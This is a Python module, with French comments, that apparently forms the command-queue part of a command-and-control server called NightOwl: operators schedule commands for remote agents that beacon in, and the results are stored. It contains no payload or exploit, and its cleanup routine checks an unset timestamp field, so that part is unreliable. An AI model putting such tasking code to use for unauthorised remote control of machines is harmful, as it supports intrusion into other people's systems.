#!/usr/bin/env python3
"""
Gestionnaire de commandes pour le serveur NightOwl
"""

import logging
from typing import Dict, List, Optional, Any


class CommandHandler:
    """Gère l'exécution et le suivi des commandes"""
    
    def __init__(self, session_manager, database):
        self.session_manager = session_manager
        self.db = database
        self.logger = logging.getLogger("nightowl.command_handler")
        self.pending_commands: Dict[str, Dict] = {}
    
    async def execute_command(self, session_id: str, command: str, params: Dict = None) -> Dict:
        """Planifie l'exécution d'une commande sur un agent"""
        
        if not self.session_manager.validate_session(session_id):
            return {
                "status": "error",
                "error": "Session invalide ou expirée"
            }
        
        # Générer un ID unique pour la commande
        import uuid
        command_id = str(uuid.uuid4())
        
        # Stocker la commande en attente
        cmd_data = {
            "id": command_id,
            "session_id": session_id,
            "command": command,
            "params": params or {},
            "status": "pending",
            "created_at": self._get_timestamp()
        }
        self.pending_commands[command_id] = cmd_data
        
        # Sauvegarder en base de données
        if self.db:
            self.db.save_command(cmd_data)
        
        self.logger.info(f"Command scheduled: {command_id} - {command}")
        
        return {
            "status": "success",
            "command_id": command_id,
            "next_beacon": self.session_manager.get_next_beacon_time()
        }
    
    def get_pending_command(self, session_id: str) -> Optional[Dict]:
        """Récupère la prochaine commande en attente pour une session"""
        for command_id, cmd_data in self.pending_commands.items():
            if cmd_data["session_id"] == session_id and cmd_data["status"] == "pending":
                cmd_data["status"] = "executing"
                return {
                    "id": command_id,
                    "command": cmd_data["command"],
                    "params": cmd_data["params"]
                }
        return None
    
    async def process_command_result(self, command_id: str, result: Dict) -> bool:
        """Traite le résultat d'une commande exécutée"""
        
        if command_id not in self.pending_commands:
            self.logger.warning(f"Unknown command result: {command_id}")
            return False
        
        cmd_data = self.pending_commands[command_id]
        cmd_data["status"] = "completed"
        
        # Unwrap result if nested
        if "result" in result and isinstance(result["result"], dict):
            cmd_data["result"] = result["result"]
        else:
            cmd_data["result"] = result
            
        cmd_data["completed_at"] = self._get_timestamp()
        
        # Mettre à jour en base de données
        if self.db:
            self.db.update_command_result(
                command_id,
                cmd_data["status"],
                cmd_data["result"],
                cmd_data["completed_at"]
            )
        
        # Journaliser le résultat
        self.logger.info(f"Command completed: {command_id} - Status: {result.get('status', 'unknown')}")
        
        return True
    
    async def handle_operator_command(self, data: Dict) -> Dict:
        """Traite une commande envoyée par un opérateur"""
        
        required_fields = ['session_id', 'command', 'operator']
        for field in required_fields:
            if field not in data:
                return {
                    "status": "error", 
                    "error": f"Champ requis manquant: {field}"
                }
        
        # Planifier l'exécution de la commande
        result = await self.execute_command(
            data['session_id'],
            data['command'],
            data.get('params', {})
        )
        
        return result
    
    def get_command_status(self, command_id: str) -> Optional[Dict]:
        """Récupère le statut et le résultat d'une commande"""
        return self.pending_commands.get(command_id)

    def _cleanup_old_commands(self):
        """Nettoie les commandes terminées de plus de 24h"""
        import time
        current_time = time.time()
        
        commands_to_remove = []
        for command_id, cmd_data in self.pending_commands.items():
            if cmd_data["status"] == "completed":
                # Supprimer après 24h
                if current_time - cmd_data.get("_timestamp", 0) > 86400:
                    commands_to_remove.append(command_id)
        
        for command_id in commands_to_remove:
            del self.pending_commands[command_id]
    
    def _get_timestamp(self) -> str:
        """Retourne un timestamp formaté"""
        from datetime import datetime, timezone
        return datetime.now(timezone.utc).isoformat()